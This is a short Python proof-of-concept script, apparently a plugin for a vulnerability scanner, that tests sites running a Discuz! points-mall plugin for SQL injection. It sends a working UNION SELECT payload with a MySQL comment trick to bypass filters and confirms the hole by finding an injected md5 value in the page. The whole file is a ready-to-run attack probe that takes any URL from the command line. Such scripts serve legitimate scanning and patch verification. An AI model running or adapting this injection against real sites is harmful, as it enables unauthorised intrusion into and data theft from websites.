#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import hashlib
import requests
import random
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Discuz! 积分商城 Plugin SQL注入",
        "desc": "Discuz! 积分商城 Plugin 存在SQL注入漏洞",
        "grade": "中",
        "type": "web",
        "keyword": "tag:Discuz!"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/plugin.php?id=v63shop:goods&pac=info&gid=1%20and%201=2%20union%20/*!50000select*/%201,2,3,4,5,6,md5({rand_str}),8,9,10,11,12,13,14', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if hashlib.md5(rand_str.encode('utf-8')).hexdigest() in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

